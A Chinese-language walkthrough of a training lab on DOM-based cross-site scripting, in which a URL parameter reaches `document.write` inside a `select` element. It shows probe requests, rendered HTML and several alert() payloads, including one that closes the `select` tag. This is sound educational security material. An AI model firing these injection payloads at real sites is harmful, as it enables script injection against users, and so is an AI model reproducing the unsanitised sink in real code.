## 实验：在使用 `location.search` 作为源并在 `select` 元素内部的 `document.write` 汇点中的 DOM XSS

本实验在库存检查（stock checker）功能中包含一个基于 DOM 的跨站脚本（XSS）漏洞。它使用了 JavaScript 的 `document.write` 函数，该函数会将数据写入页面。`document.write` 函数被调用时使用的数据来自 `location.search`，你可以通过网站 URL 来控制这部分数据。这些数据被包裹在一个 `select`（下拉选择）元素内部。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要跳出 `select` 元素并调用 `alert` 函数。

## 步骤

探测
- 浏览商品页面
    ```http
    GET /product?productId=1 HTTP/2
    ```

    - 响应
        ```html
        <form id="stockCheckForm" action="/product/stock" method="POST">
            <input required type="hidden" name="productId" value="1">
            <script>
                var stores = ["London","Paris","Milan"];
                var store = (new URLSearchParams(window.location.search)).get('storeId');
                document.write('<select name="storeId">');
                if(store) {
                    document.write('<option selected>'+store+'</option>');
                }
                for(var i=0;i<stores.length;i++) {
                    if(stores[i] === store) {
                        continue;
                    }
                    document.write('<option>'+stores[i]+'</option>');
                }
                document.write('</select>');
            </script>
            <button type="submit" class="button">Check stock</button>
        </form>
        ```
        - 源 `window.location.search`
        - 汇 `document.write`
        - 若搜索段存在字段 `storeId`，则将此内容加入 `select` 列表中

    - 浏览器显示
        ```html
        <select name="storeId">
            <option>London</option>
            <option>Paris</option>
            <option>Milan</option>
        </select>
        ```

定位
- 在商品页面中添加 `storeId` 字段
    ```http
    GET /product?productId=1&storeId=o2717zdu HTTP/2
    ```

    - 浏览器显示
        ```html
        <select name="storeId">
            <option selected="">o2717zdu</option>
            <option>London</option>
            <option>Paris</option>
            <option>Milan</option>
        </select>
        ```

攻击
- 载荷 `<svg onload=alert()>` 
    ```http
    GET /product?productId=1&storeId=%3Csvg+onload%3dalert()%3E HTTP/2
    ```
    - 浏览器渲染
        ```html
        <select name="storeId">
            <option selected=""><svg onload="alert()"></svg></option>
            <option>London</option>
            <option>Paris</option>
            <option>Milan</option>
        </select>        
        ```
        - 虽然成功弹窗，但无法通过挑战（未跳出 `select`）
- 载荷 `<img src onerror=alert()>` 成功弹窗
- 载荷 `<script>alert()</script>` 成功弹窗
- 载荷 `</select><img+src+onerror%3dalert()>` 
    - 添加了 `select` 闭标签，弹窗的同时通过挑战

普通载荷即可在 `select option` 标签内触发 JS 代码执行
